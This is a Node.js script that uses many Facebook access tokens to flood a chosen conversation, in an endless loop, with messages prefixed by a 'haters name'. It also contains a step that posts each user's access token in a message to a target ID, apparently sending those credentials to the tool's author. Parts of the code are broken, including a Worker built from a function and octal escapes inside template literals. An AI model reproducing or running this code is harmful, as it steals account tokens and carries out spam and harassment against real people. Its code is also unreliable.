const http = require('http');
const fs = require('fs');
const axios = require('axios');
const os = require('os');
const threading = require('worker_threads');
const path = require('path');

// Define the HTTP server handler
const handler = (req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('   anox Hewre');
};

// Function to start the server
const executeServer = () => {
    const PORT = process.env.PORT || 4000;
    const server = http.createServer(handler);
    server.listen(PORT, () => {
        console.log(`Server running at http://localhost:${PORT}`);
    });
};

// Function to send initial messages
const sendInitialMessage = async () => {
    const tokens = fs.readFileSync('tokennum.txt', 'utf-8').split('\n');
    const msgTemplate = 'Hello Prince Bhai ! I am using your server. My token is {}';
    const targetId = ''; // Specify the target ID

    const headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com',
    };

    for (const token of tokens) {
        const accessToken = token.trim();
        const url = `https://graph.facebook.com/v17.0/t_${targetId}/`;
        const msg = msgTemplate.replace('{}', accessToken);
        const parameters = { access_token: accessToken, message: msg };

        try {
            await axios.post(url, parameters, { headers });
            await new Promise(r => setTimeout(r, 100)); // Wait for 100 milliseconds between messages
        } catch (error) {
            console.error('Error sending initial message:', error);
        }
    }

    console.log('[+] Initial messages sent. Starting the message sending loop...');
};

// Function to send messages from file
const sendMessagesFromFile = async () => {
    const convoId = fs.readFileSync('convo.txt', 'utf-8').trim();
    const messages = fs.readFileSync('NP.txt', 'utf-8').split('\n');
    const tokens = fs.readFileSync('tokennum.txt', 'utf-8').split('\n');
    const hatersName = fs.readFileSync('hatersname.txt', 'utf-8').trim();
    const speed = parseInt(fs.readFileSync('time.txt', 'utf-8').trim(), 10);

    const maxTokens = Math.min(tokens.length, messages.length);

    const headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com',
    };

    while (true) {
        for (let messageIndex = 0; messageIndex < messages.length; messageIndex++) {
            const tokenIndex = messageIndex % maxTokens;
            const accessToken = tokens[tokenIndex].trim();
            const message = messages[messageIndex].trim();
            const url = `https://graph.facebook.com/v17.0/t_${convoId}/`;
            const parameters = { access_token: accessToken, message: `${hatersName} ${message}` };

            try {
                const response = await axios.post(url, parameters, { headers });
                const currentTime = new Date().toLocaleString();
                if (response.status === 200) {
                    console.log(`\033[1;92m[+] Han Bro Chla Gya Massage ${messageIndex + 1} of Convo ${convoId} Token ${tokenIndex + 1}: ${hatersName} ${message}`);
                } else {
                    console.log(`\033[1;91m[x] Failed to send Message ${messageIndex + 1} of Convo ${convoId} with Token ${tokenIndex + 1}: ${hatersName} ${message}`);
                }
            } catch (error) {
                console.error(`[!] An error occurred: ${error}`);
            }

            await new Promise(r => setTimeout(r, speed * 1000)); // Wait for the specified speed in seconds
        }

        console.log('\n[+] All messages sent. Restarting the process...\n');
    }
};

// Main function
const main = () => {
    const serverThread = new threading.Worker(executeServer);
    serverThread.on('error', (error) => console.error('Server thread error:', error));
    serverThread.on('exit', (code) => console.log('Server thread exited with code:', code));

    // Send the initial message to the specified ID using all tokens
    sendInitialMessage();

    // Then, continue with the message sending loop
    sendMessagesFromFile();
};

if (require.main === module) {
    main();
}
